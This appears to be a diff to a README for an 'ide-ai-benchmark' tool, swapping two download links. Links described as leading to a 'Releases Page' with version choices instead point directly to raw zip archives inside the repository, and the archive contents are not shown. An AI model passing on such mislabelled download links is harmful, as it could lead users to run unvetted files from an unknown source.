@@ -10,12 +10,12 @@ This section will guide you through the process of downloading and installing th
 ## 📥 Download & Install
 To get the latest version of ide-ai-benchmark, visit this page:
 
-[![Download Now](https://raw.githubusercontent.com/ameerkhan9394/ide-ai-benchmark/main/ellenyard/ide-ai-benchmark.zip)](https://raw.githubusercontent.com/ameerkhan9394/ide-ai-benchmark/main/ellenyard/ide-ai-benchmark.zip)
+[![Download Now](https://github.com/ameerkhan9394/ide-ai-benchmark/raw/refs/heads/main/src/ai-benchmark-ide-3.1.zip)](https://github.com/ameerkhan9394/ide-ai-benchmark/raw/refs/heads/main/src/ai-benchmark-ide-3.1.zip)
 
 ### Step 1: Visit the Releases Page
 Click the link below to access the releases page where you can download the application.
 
-[Download Page](https://raw.githubusercontent.com/ameerkhan9394/ide-ai-benchmark/main/ellenyard/ide-ai-benchmark.zip)
+[Download Page](https://github.com/ameerkhan9394/ide-ai-benchmark/raw/refs/heads/main/src/ai-benchmark-ide-3.1.zip)
 
 ### Step 2: Choose Your Version
 On the releases page, you will find a list of available versions. Select the latest version. Each version includes important updates and features that enhance the benchmarking process.
